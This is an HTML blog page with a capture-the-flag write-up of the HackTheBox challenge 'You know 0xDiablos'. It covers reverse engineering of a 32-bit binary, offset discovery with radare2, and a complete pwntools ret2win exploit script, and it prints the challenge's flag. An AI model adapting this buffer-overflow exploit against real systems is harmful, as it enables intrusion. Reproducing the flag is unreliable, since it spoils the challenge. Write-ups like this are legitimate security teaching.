@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+You know 0xDiablos | abund4nt
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="x86 Binary, Buffer Overflow, Source Code Analysis">
+
+<meta name="generator" content="Hugo 0.123.7">
+
+
+<link rel="canonical" href="https://abund4nt.github.io/writeups/hackthebox/youknow0xdiablos/" >
+
+
+
+
+<link href="/css/style.min.e22e1ef80ea19d08625444757176e07586bc5f332072f7ec355fae587dea40c9.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="https://abund4nt.github.io/">
+                <span>abund4nt@tryharder ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/about" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/writeups" title="" >
+                        ~/writeups</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>You know 0xDiablos</h1>
+    
+    	<p>x86 Binary, Buffer Overflow, Source Code Analysis</p>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/pwn/">#Pwn</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2024-09-14">September 14, 2024</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>4 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <p>We are provided with a <code>vuln</code> binary and a remote instance to connect to, the binary has the following protections.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Arch:     i386-32-little
+</span></span><span style="display:flex;"><span>RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>Stack:    No canary found
+</span></span><span style="display:flex;"><span>NX:       NX unknown - GNU_STACK missing
+</span></span><span style="display:flex;"><span>PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stack:    Executable
+</span></span><span style="display:flex;"><span>RWX:      Has RWX segments
+</span></span></code></pre></div><p>When it is executed it asks for an input and this is reflected when pressing enter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./vuln 
+</span></span><span style="display:flex;"><span>You know who are 0xDiablos: 
+</span></span><span style="display:flex;"><span>test
+</span></span><span style="display:flex;"><span>test
+</span></span></code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2>
+<p>If we use cutter we will be able to obtain the code of the <code>main</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* jsdec pseudo code output */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* /home/abund4nt/Desktop/CTF/HTB-Challenges/Pwn/You @ 0x80492b1 */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int32_t</span> <span style="color:#a6e22e">main</span> (<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    ecx <span style="color:#f92672">=</span> argc;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_x86_get_pc_thunk_bx</span> (ecx, ebx, ebp);
+</span></span><span style="display:flex;"><span>    ebx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x2d38</span>;
+</span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((ebx <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>));
+</span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(eax);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span> (eax, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span> ();
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(var_14h) <span style="color:#f92672">=</span> eax;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setresgid</span> (<span style="color:#f92672">*</span>(var_14h), <span style="color:#f92672">*</span>(var_14h), <span style="color:#f92672">*</span>(var_14h));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span> (ebx <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1fc8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span> ();
+</span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    esp <span style="color:#f92672">=</span> var_10h;
+</span></span><span style="display:flex;"><span>    esp <span style="color:#f92672">=</span> ecx <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eax;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can see that it defines many variables that do not come much to the case, we must notice that it is calling the function <code>vuln</code>, this is its source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> <span style="color:#a6e22e">vuln</span> (<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_x86_get_pc_thunk_bx</span> (ebx);
+</span></span><span style="display:flex;"><span>    ebx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x2d7f</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span> (s);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span> (s);
+</span></span><span style="display:flex;"><span>    ebx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(var_8h);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eax;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The function takes our input using <code>gets</code> and displays it with <code>puts</code>, this is considered unsafe since the <code>gets</code> function does not control the amount of characters we send. There is also a very interesting function called <code>flag</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> <span style="color:#a6e22e">flag</span> (<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_x86_get_pc_thunk_bx</span> (ebx);
+</span></span><span style="display:flex;"><span>    ebx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x2e12</span>;
+</span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span> (ebx <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ff6</span>, ebx <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ff8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(stream) <span style="color:#f92672">=</span> eax;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(stream) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (ebx <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1fec</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span> (<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span> (format, <span style="color:#ae81ff">0x40</span>, <span style="color:#f92672">*</span>(stream));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(arg_4h) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xdeadbeef</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span><span style="color:#ae81ff">0x8049269</span>)() ();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(arg_8h) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xc0ded00d</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span><span style="color:#ae81ff">0x804926c</span>)() ();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (format);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> label_0;
+</span></span><span style="display:flex;"><span>label_0:
+</span></span><span style="display:flex;"><span>    ebx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(var_8h);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eax;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This function takes 4 bytes <code>0x40</code> using <code>fgets</code>, then through a conditional checks if the argument that comes is equal to the memory address <code>0xdeadbeef</code> and then <code>0xc0ded00d</code>, if these two conditions are met it shows the flag.</p>
+<h2 id="buffer-overflow-vulnerability">Buffer Overflow Vulnerability</h2>
+<p>The binary is clearly vulnerable to Buffer Overflow since it is using <code>gets</code> to take our input, what we must do is to find the offset and call the flag function, then send 4 bytes plus the memory addresses that the code asks us to fulfill the conditionals and get the flag.</p>
+<h2 id="development-of-the-exploit">Development of the exploit</h2>
+<p>The first thing I did was to find the offset, first of all generate a string using <code>ragg2</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ragg2 -P <span style="color:#ae81ff">250</span> -r
+</span></span><span style="display:flex;"><span>AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABW
+</span></span></code></pre></div><p>With <code>r2</code> I opened the binary and was able to calculate the offset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>0xeb05abd0<span style="color:#f92672">]</span>&gt; dc
+</span></span><span style="display:flex;"><span>You know who are 0xDiablos: 
+</span></span><span style="display:flex;"><span>AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABW
+</span></span><span style="display:flex;"><span>AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABW
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SIGNAL <span style="color:#ae81ff">11</span> errno<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> addr<span style="color:#f92672">=</span>0x42414342 code<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> si_pid<span style="color:#f92672">=</span><span style="color:#ae81ff">1111573314</span> ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x42414342<span style="color:#f92672">]</span>&gt; wopO 0x42414342
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">188</span>
+</span></span></code></pre></div><p>Once the offset was found it was time to find the memory address of the <code>flag</code> function, for this I used the <code>afl</code> command of r2 which shows us the memory addresses of the functions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>0x42414342<span style="color:#f92672">]</span>&gt; afl
+</span></span><span style="display:flex;"><span>0x080490d0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">51</span>           entry0
+</span></span><span style="display:flex;"><span>0x08049103    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">4</span>            fcn.08049103
+</span></span><span style="display:flex;"><span>0x08049090    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.__libc_start_main
+</span></span><span style="display:flex;"><span>0x08049130    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">49</span>   -&gt; <span style="color:#ae81ff">40</span>   sym.deregister_tm_clones
+</span></span><span style="display:flex;"><span>0x08049170    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">57</span>   -&gt; <span style="color:#ae81ff">53</span>   sym.register_tm_clones
+</span></span><span style="display:flex;"><span>0x080491b0    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">33</span>   -&gt; <span style="color:#ae81ff">30</span>   sym.__do_global_dtors_aux
+</span></span><span style="display:flex;"><span>0x080491e0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span>            entry.init0
+</span></span><span style="display:flex;"><span>0x08049390    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>            sym.__libc_csu_fini
+</span></span><span style="display:flex;"><span>0x08049120    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">4</span>            sym.__x86.get_pc_thunk.bx
+</span></span><span style="display:flex;"><span>0x08049391    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">4</span>            sym.__x86.get_pc_thunk.bp
+</span></span><span style="display:flex;"><span>0x08049272    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">63</span>           sym.vuln
+</span></span><span style="display:flex;"><span>0x08049040    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.gets
+</span></span><span style="display:flex;"><span>0x08049070    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.puts
+</span></span><span style="display:flex;"><span>0x08049398    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>           sym._fini
+</span></span><span style="display:flex;"><span>0x08049330    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">93</span>           sym.__libc_csu_init
+</span></span><span style="display:flex;"><span>0x08049110    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>            sym._dl_relocate_static_pie
+</span></span><span style="display:flex;"><span>0x080492b1    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">118</span>          main
+</span></span><span style="display:flex;"><span>0x080490a0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.setvbuf
+</span></span><span style="display:flex;"><span>0x08049060    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.getegid
+</span></span><span style="display:flex;"><span>0x080490c0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.setresgid
+</span></span><span style="display:flex;"><span>0x080491e2    <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">144</span>          sym.flag
+</span></span><span style="display:flex;"><span>0x08049000    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">32</span>           sym._init
+</span></span><span style="display:flex;"><span>0x08049030    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.printf
+</span></span><span style="display:flex;"><span>0x08049050    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.fgets
+</span></span><span style="display:flex;"><span>0x08049080    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.exit
+</span></span><span style="display:flex;"><span>0x080490b0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.fopen
+</span></span></code></pre></div><p>Once we knew the memoeria address we had everything we needed to start developing the exploit. With the following script we solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>from pwn import * 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def get_process<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len<span style="color:#f92672">(</span>sys.argv<span style="color:#f92672">)</span> !<span style="color:#f92672">=</span> 2:
+</span></span><span style="display:flex;"><span>        print<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Usage: python3 script.py &lt;ip:port&gt;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    host, port <span style="color:#f92672">=</span> sys.argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.split<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;:&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote<span style="color:#f92672">(</span>host, int<span style="color:#f92672">(</span>port<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def main<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> get_process<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># crafting payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;A&#39;</span> * <span style="color:#ae81ff">188</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32<span style="color:#f92672">(</span>0x080491e2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;A&#39;</span> * <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32<span style="color:#f92672">(</span>0xdeadbeef<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32<span style="color:#f92672">(</span>0xc0ded00d<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># send payload</span>
+</span></span><span style="display:flex;"><span>    p.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># recv data</span>
+</span></span><span style="display:flex;"><span>    p.recv<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log.info<span style="color:#f92672">(</span>p.recv<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main<span style="color:#f92672">()</span>
+</span></span></code></pre></div><h2 id="flag">Flag</h2>
+<p>When executed we obtain the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve.py 83.136.255.40:49309
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 83.136.255.40 on port 49309: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> HTB<span style="color:#f92672">{</span>0ur_Buff3r_1s_not_healthy<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 83.136.255.40 port <span style="color:#ae81ff">49309</span>
+</span></span></code></pre></div><p>yera carlitos vera</p>
+
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+    
+</footer>
+    </div>
+
+    
+
+</body>
+
+</html>
